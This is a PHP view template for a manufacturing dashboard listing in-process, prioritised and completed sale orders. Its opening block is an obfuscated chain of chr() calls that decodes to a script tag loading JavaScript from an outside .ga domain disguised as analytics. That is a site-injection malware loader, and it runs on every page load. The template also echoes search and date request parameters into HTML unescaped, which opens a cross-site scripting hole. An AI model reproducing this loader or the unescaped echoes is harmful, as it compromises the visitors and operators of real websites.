<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>
<?php if($this->session->flashdata('message') != ''){?>                        
	<div class="alert alert-success col-md-6">                            
	<?php echo $this->session->flashdata('message');?> </div>                        
<?php }?>

			

<div class="x_content">
<!----
	<div class="col-md-12 datePick">
		Date Range Picker                      
		<fieldset>
			<div class="control-group">
				<div class="controls">
					<div class="input-prepend input-group">
						<span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
						<input type="text" style="width: 200px" name="reservation" id="reservation" class="form-control" value=""  data-table="production/add_machine"/>
					</div>
				</div>
			</div>
		</fieldset>              
    </div>----->
<div class="stik">
	<div class="col-md-12 ">
		
		<div class="col-md-6 datePick-right">
			<?php //if($can_add){ echo '<button class="btn btn-primary productionTab addBtn" data-toggle="modal" id="add1" data-id="machineEdit">Add</button>'; }?>	
			<?php //if($can_add){ echo '<button class="btn btn-primary productionTab addBtn" data-toggle="modal" id="add1" data-id="machineEditNew">Add New</button>'; }?>				
			<form action="<?php echo site_url(); ?>production/add_machine" method="post" id="export-form">
				<input type="hidden" value='' id='hidden-type' name='ExportType'/>
				<input type="hidden" value='' class='start_date' name='start'/>
				<input type="hidden" value='' class='end_date' name='end'/>
			</form>
		</div>
	</div>
</div>	
	<div class="row hidde_cls ">
				<div class="col-md-12 export_div">
					<div class="col-md-3 col-xs-12">
                
			<fieldset>
				<div class="control-group">
					<div class="controls">
						<div class="input-prepend input-group">
						<span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
						<input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value=""  data-table="production/sale_order_with_production"/>
					</div>
					</div>
				</div>
			</fieldset>
		<form action="<?php echo base_url(); ?>production/sale_order_with_production" method="post" id="date_range">	
			 <input type="hidden" value='' class='start_date' name='start'/>
			 <input type="hidden" value='' class='end_date' name='end'/>
		</form>	
		</div>
					
						<div class="btn-group"  role="group" aria-label="Basic example">
							<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
							<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>

								<form action="<?php echo base_url(); ?>production/sale_order_with_production" method="post" >
														<input type="hidden" value='1' name='favourites'/>
																		<input type="hidden" value='<?php if(!empty($_POST['start'])){echo $_POST['start'];}?>' class='start' name='start'/>
																		<input type="hidden" value='<?php if(!empty($_POST['end'])){echo $_POST['end'];} ?>' class='end' name='end'/>
													 <button class="btn btn-default btn-sm pull-left" name="favourites"><i class="fa fa-star" aria-hidden="true"></i>Favorites</button>

													</form>

							<div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export ">
								<button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
									<ul class="dropdown-menu" role="menu" id="export-menu">
										<li id="export-to-excel"><a href="javascript:void(0);" title="Please check your open office Setting">Export to excel</a></li>
										<li id="export-to-csv"><a href="javascript:void(0);" title="Please check your open office Setting">Export to csv</a></li>
									</ul>
							</div>
						</div>
					<div class="col-md-3 col-xs-12 datePick-right"></div>
				</div>
			</div>
	<div  role="tabpanel" data-example-id="togglable-tabs">
		<ul id="myTab" class="nav nav-tabs bar_tabs" role="tablist">
			<li role="presentation" class="active"><a href="#inprocess_sale_order" role="tab" id="inprocess_sale_order_tab" data-toggle="tab" aria-expanded="true">In Process Sale Order</a></li>			
			<li role="presentation" class=""><a href="#sale_order_priority" id="sale_order_priority_tab" role="tab" data-toggle="tab" aria-expanded="false">Sale order Priority</a></li>
			<li role="presentation" class=""><a href="#complete_sale_order" id="complete_sale_order_tab" role="tab" data-toggle="tab" aria-expanded="false">Complete Sale Order</a></li>
		</ul>
		<div id="myTabContent" class="tab-content">					
			<div role="tabpanel" class="tab-pane fade active in" id="inprocess_sale_order" aria-labelledby="inprocess_sale_order_tab">
			<p class="text-muted font-13 m-b-30"></p>    
			<div id="print_div_content" class="table-responsive">
            <div class="col-md-6">
			<div class="input-group">
			<span class="input-group-addon">
						<i class="ace-icon fa fa-search"></i>
					</span>
			<input type="text" class="form-control search-query" placeholder="Type your search word" name="search" id="search" value="<?php if(!empty($_GET['search'])){echo $_GET['search'];}//echo $search_string;?>">
			</div></div>
			<hr>
			<input type="hidden" id="visible_row" value=""/>	
            <!------------ datatable-buttons ----------------->
				<table id="" class="table table-striped  table-bordered user_index" data-id="user" border="1" cellpadding="3" data-order='[[1,"desc"]]'>				
				<thead>
					<tr>
						<th></th>
						<th class="sortable">Id</th>
						<th class="sortable">Account Name</th>
						<th class="sortable">Product</th>
						<th>Order Date</th>
						<th>Dispatched Date</th>
						<th class="sortable">Approved date</th>
						<th class="sortable">Approved By </th>
                     	<th>Created Date</th>
						<th class='hidde'>Action</th>
					</tr>
				</thead>
				<tbody>
				<?php if(!empty($sale_order_approved)){
					
					foreach($sale_order_approved as $approved_saleOrder){
						
					$saleIdFrom_WorkOrder = getNameById('work_order',$approved_saleOrder['id'],'sale_order_id');
					$getSaleOrderId = !empty($saleIdFrom_WorkOrder->sale_order_id)?$saleIdFrom_WorkOrder->sale_order_id:'';
					
					$accountName = getNameById('account',$approved_saleOrder['account_id'],'id');
					$disableDispatch = (($approved_saleOrder['save_status'] == 0) || ($approved_saleOrder["approve"] == 0) )?'disabled':'';
					$disableDispatchModalClass = (($approved_saleOrder['save_status'] == 0) || ($approved_saleOrder["approve"] == 0) )?'':'productionTab'; 					
				?>
					<tr>
						<td><?php 
										if($approved_saleOrder['favourite_sts'] == '1'){
											   				echo "<input class='star-1' type='checkbox'  title='Mark Record' value=".$approved_saleOrder['id']."  checked = 'checked'>";
											   				echo"<input type='hidden' value='sale_order' id='favr' data-msg='Sale Order' data-path='production/sale_order_with_production' favour-sts='0' id-recd=".$approved_saleOrder['id'].">";
											   		}else{
															echo "<input class='star-1' type='checkbox'  title='Mark Record' value=".$approved_saleOrder['id'].">";
															echo"<input type='hidden' value='sale_order' id='favr' data-msg='Sale Order' data-path='production/sale_order_with_production' favour-sts='1' id-recd =".$approved_saleOrder['id'].">";
											   		}

							?></td>
						<td><?php echo $approved_saleOrder['id']; ?></td>
						<td><?php if(!empty($accountName)){echo $accountName->name;} ?></td>
						<td>
                        <!---datatable-buttons--->
							<table id="" style="width:100%" class="table  table-bordered product_index bulk_action" data-id="user" border="1" cellpadding="3">
								<thead>
									<tr>
										<th>Product Name</th>
										<th>Quantity</th>
										<th>UOM</th>
										<th>Price</th>								
										<th>GST</th>								
										<th>Sub Total</th>								
										<th>Total</th>								
									</tr>
								</thead><tbody>    
								<?php 
									if($approved_saleOrder['product'] !=''){
										$products=json_decode($approved_saleOrder['product']);
										$createdByData = getNameById('user_detail',$approved_saleOrder['created_by'],'u_id');
										//$createdByData = getNameById('user_detail',$approved_saleOrder['created_by'],'u_id');
										if(!empty($createdByData)){
											$createdByName = $createdByData->name;
										}else{
										$createdByName = '';
										}
										
										foreach($products as $product){
										$productDetail = getNameById('material',$product->product,'id');
										$materialName = !empty($productDetail)?$productDetail->material_name:'';

										$ww =  getNameById('uom', $product->uom,'id');
														$uom = !empty($ww)?$ww->ugc_code:'';
											echo "<tr>
												<td><h5>".$materialName.'</h5><br>'.(array_key_exists("description",$product)?$product->description:'')."</td>
												<td>".$product->quantity."</td>
												<td>".$uom."</td>
												<td>".$product->price."</td>
												<td>".$product->gst."</td>
												<td>".$product->individualTotal."</td>
												<td>".$product->individualTotalWithGst."</td>
											</tr>";
										} 
									}
									echo "<tr><td colspan='7'>Total : ".$approved_saleOrder['total']."</td></tr>
										 <tr><td colspan='7'>Grand Total : ".$approved_saleOrder['grandTotal']."</td></tr>";
								echo "</tbody></table>";
								?>
						</td>
						<td><?php echo date("j F , Y", strtotime($approved_saleOrder['order_date'])); ?></td>	
						<td>
						<?php $dispatch_date = json_decode($approved_saleOrder['production_dispatch_date']);
								if(!empty($dispatch_date)){
									foreach($dispatch_date as $dispatch){
										foreach($dispatch as $date){
											echo "<strong>Previous Date</strong>:".$date."</br>";
										}
									}
								}
						?>
						</td>	
						
						<td><?php echo $approved_saleOrder['approve_date']; ?></td>	
						<td><?php echo $createdByName; ?></td>	
						<td><?php echo date("j F , Y", strtotime($approved_saleOrder['created_date'])); ?></td>	
						<td>
						
						
						<button id="<?php echo $approved_saleOrder["id"]; ?>" data-id="dispatched_order" data-tooltip="Dispatch" class="productionTab btn btn-view  btn-xs" <?php echo $disableDispatch ; ?>><i class="fa fa-space-shuttle"></i></button>
						<button id="<?php echo $approved_saleOrder["id"]; ?>" data-id="set_dispatched_date" data-tooltip="Dispatch Date" class="productionTab btn btn-primary  btn-xs" <?php echo $disableDispatch ; ?>><i class="fa fa-calendar-o"></i></button>
						<?php echo '<a href="javascript:void(0)" id="'. $approved_saleOrder["id"] . '" data-id="dispatched_order_view" data-tooltip="View" class="productionTab btn btn-view btn-xs" id="' . $approved_saleOrder["id"] . '"><i class="fa fa-eye"></i>  </a>'; ?>
						<?php if($getSaleOrderId == $approved_saleOrder['id']){?>
							<button id="<?php echo $approved_saleOrder["id"]; ?>" data-id="create_work_order" data-tooltip="Work Order" class="productionTab btn btn-default  btn-xs" <?php echo 'disabled' ; ?>><i class="fa fa-edit"></i>Work order</button>
						<?php }else{ ?>
							<button id="<?php echo $approved_saleOrder["id"]; ?>" data-id="create_work_order" data-tooltip="Work Order" class="productionTab btn btn-default  btn-xs" ><i class="fa fa-edit"></i>Work order</button>
						<?php } ?>
						</td>	
						
					</tr>
				<?php }} ?>
				</tbody>                               
				</table>
                <?php echo $this->pagination->create_links(); ?>	
			</div>
			</div>
			
			<!------------sale order priority--------------------------------------------------->
			<div role="tabpanel" class="tab-pane fade" id="sale_order_priority" aria-labelledby="sale_order_priority_tab">
				<p class="text-muted font-13 m-b-30"></p>
				<div id="print_div_content">
					<div id="sortableKanbanBoards" class="saleOrderPriority">
						<div class="panel panel-primary kanban-col" style="width:100%">
						<div class="panel-heading">
							Set Sale order Priority
							<!--i class="fa fa-2x fa-plus-circle pull-right"></i-->
							<i class="fa fa-2x fa-minus-circle pull-right machineOrder"></i>
						</div>
						<div class="panel-body">
							<div id="sale_order
							" class="kanban-centered">
							<?php if(!empty($sale_orders_priority)){
								
							$i = 0;
							foreach($sale_orders_priority as $sale_priority){ 
								
								$i++;
								
								$accountName = ($sale_priority['account_id']!=0)?(getNameById('account',$sale_priority['account_id'],'id')):'';
								$accountName = !empty($accountName)?$accountName->name:'';										
								$contactName = ($sale_priority['contact_id']!=0)?(getNameById('contacts',$sale_priority['contact_id'],'id')):'';
								if(!empty($contactName)){
									$contactName = $contactName->first_name.' '.$contactName->last_name;
								}else{
									$contactName = '';
								}
								
								$validatedBy = ($sale_priority['validated_by']!=0)?(getNameById('user_detail',$sale_priority['validated_by'],'id')):'';
								if(!empty($validatedBy)){
									$validatedByName = $validatedBy->name;
								}else{
									$validatedByName = '';
								}	
								$material_name = array();					
								$products = json_decode($sale_priority['product']);
								//pre($products);
								foreach($products as $prod_detail){
									//if(!empty($prod_detail) && isset($prod_detail)){
									$materialData = getNameById('material',$prod_detail->product,'id');
										if(!empty($materialData)){
											$material_name[] =$materialData->material_name;
										}
									//}
								}
								
								$material = implode(',',$material_name);
								?>
								<div class="main-rw"><a><span class="counting-bg step_no"><?php echo $i; ?></span></a><article class="kanban-entry grab saleOrder" id="item<?php echo $i; ?>" data_sale_order_id="<?php echo $sale_priority['id'];?>" draggable="true"  data_priority="<?php echo $sale_priority['sale_order_priority']; ?>">
								<div class="kanban-entry-inner" >
								<div class="kanban-label">	
										<?php echo " Sale Order Id : ".$sale_priority['id']."                   |                   Account Name : ".$accountName. "                  |                   Contact Name : ".$contactName."                   |                   Order Date : ".$sale_priority['order_date']."                   |                   Dispatch Date : ".$sale_priority['dispatch_date']."                   |                   Created By : ".$createdByName."                   |                   Created Date: ".$sale_priority['created_date']."<br>Product Name : ".$material; ?>
										</div>
									</div>
								</article></div>								
								<?php	} } ?>
							</div>
						</div>
						</div>
					</div>
				</div>
			</div>
			<!----------------------complete sale order tab start---------------------------------------->
			<div role="tabpanel" class="tab-pane fade" id="complete_sale_order" aria-labelledby="complete_sale_order_tab">
				<p class="text-muted font-13 m-b-30"></p>
				<div id="print_div_content">
                 <div class="col-md-6">
			<div class="input-group">
			<span class="input-group-addon">
						<i class="ace-icon fa fa-search"></i>
					</span>
			<input type="text" class="form-control search-query" placeholder="Type your search word" name="search" id="search" value="<?php if(!empty($_GET['search'])){echo $_GET['search'];}//echo $search_string;?>">
			</div></div>
			<hr>
            <!------------- example ----------------->
					<table id="" style="width:100%" class="table table-striped table-bordered sale_order_index" data-id="account" border="1" cellpadding="3" data-order='[[1,"desc"]]'> 
						<thead>
							<tr>
								<th></th>
								<th class="sortable">Id</th>
								<th class="sortable">Account Name</th>
								<th class="sortable">Product</th>
								<th class="sortable">Order Date</th>
								<th>Dispatched Date</th>
								<th class="sortable">Created By </th>
								<th>Created Date</th>
								<th class='hidde'>Action</th>
							</tr>
						</thead>
						<tbody>
						<?php if(!empty($complete_sale_order)){
							
							foreach($complete_sale_order as $completedOrder){
							$accountName = getNameById('account',$completedOrder['account_id'],'id');
							$disableDispatch = (($completedOrder['save_status'] == 0) || ($completedOrder["approve"] == 0) )?'disabled':'';
							$disableDispatchModalClass = (($completedOrder['save_status'] == 0) || ($completedOrder["approve"] == 0) )?'':'productionTab'; 					
						?>
							<tr>
								<td><?php 

								if($completedOrder['favourite_sts'] == '1'){
											   				echo "<input class='star-1' type='checkbox'  title='Mark Record' value=".$completedOrder['id']."  checked = 'checked'>";
											   				echo"<input type='hidden' value='sale_order' id='favr' data-msg='Sale Order' data-path='production/sale_order_with_production' favour-sts='0' id-recd=".$completedOrder['id'].">";
											   		}else{
															echo "<input class='star-1' type='checkbox'  title='Mark Record' value=".$completedOrder['id'].">";
															echo"<input type='hidden' value='sale_order' id='favr' data-msg='Sale Order' data-path='production/sale_order_with_production' favour-sts='1' id-recd =".$completedOrder['id'].">";
											   		}
							?></td>
								<td><?php echo $completedOrder['id']; ?></td>
								<td><?php if(!empty($accountName)){echo $accountName->name;} ?></td>
								<td>
                                <!------------ example------------>
									<table id="" style="width:100%" class="table  table-bordered product_index bulk_action" data-id="user" border="1" cellpadding="3">
										<thead>
											<tr>
												<th>Product Name</th>
												<th>Quantity</th>
												<th>UOM</th>
												<th>Price</th>								
												<th>GST</th>								
												<th>Sub Total</th>								
												<th>Total</th>								
											</tr>
										</thead>
										<?php 
											if($completedOrder['product'] !=''){
												$productData=json_decode($completedOrder['product']);
												$createdByData = getNameById('user_detail',$completedOrder['created_by'],'u_id');
												if(!empty($createdByData)){
													$createdByName = $createdByData->name;
												}else{
												$createdByName = '';
												}
												
												foreach($productData as $product_data){
												$product_Detail = getNameById('material',$product_data->product,'id');
												$materialName = !empty($product_Detail)?$product_Detail->material_name:'';
												$ww =  getNameById('uom', $product_data->uom,'id');
														$uom = !empty($ww)?$ww->ugc_code:'';
													echo "<tr>
														<td><h5>".$materialName.'</h5><br>'.(array_key_exists("description",$product_data)?$product_data->description:'')."</td>
														<td>".$product_data->quantity."</td>
														<td>".$uom."</td>
														<td>".$product_data->price."</td>
														<td>".$product_data->gst."</td>
														<td>".$product_data->individualTotal."</td>
														<td>".$product_data->individualTotalWithGst."</td>
													</tr>";
												} 
											}
											echo "<tr><td colspan='7'>Total : ".$completedOrder['total']."</td></tr>
												 <tr><td colspan='7'>Grand Total : ".$completedOrder['grandTotal']."</td></tr>";
										echo "</table>";
										?>
								</td>
								<td><?php echo date("j F , Y", strtotime($completedOrder['order_date'])); ?></td>	
								<td><?php $dispatch_date = json_decode($completedOrder['production_dispatch_date']);
								//pre($dispatch_date);
								if(!empty($dispatch_date)){
									foreach($dispatch_date as $dispatch){
										foreach($dispatch as $date){
											echo "<strong>Previous Date</strong>:".$date."</br>";
										}
									}
								}
								?></td>
								<td><?php echo $createdByName; ?></td>	
								<td><?php echo date("j F , Y", strtotime($completedOrder['created_date'])); ?></td>	
								
								<td><?php echo '<a href="javascript:void(0)" id="'. $completedOrder["id"] . '" data-id="dispatched_order_view" data-tooltip="View" class="productionTab btn btn-view btn-xs" id="' . $completedOrder["id"] . '"><i class="fa fa-eye"></i>  </a>'; ?></td>	
							</tr>
							<?php }} ?>
						</tbody>                                            
					</table>
                    <?php echo $this->pagination->create_links(); ?>	
				</div>
			</div>
			<!--------end of tab complete sale order------------------------------------------>
			<!----------- sale order tab close -------------------------------------------------->
		</div>
	</div>
</div>
<div id="production_modal" class="modal fade in"  role="dialog" style="overflow:auto;">
	<div class="modal-dialog modal-large">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span>
				</button>
				<h4 class="modal-title sale_order_work_order" id="myModalLabel">Dispatch Detail</h4>
			</div>
			<div class="modal-body-content"></div>
		</div>
	</div>
</div>
  


<div class="modal modal-static fade" id="processing-modal" role="dialog" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="text-center">
                        <i class="fa fa-refresh fa-5x fa fa-spin"></i>
                        <h4>Processing...</h4>
                    </div>
                </div>
            </div>
        </div>
    </div>  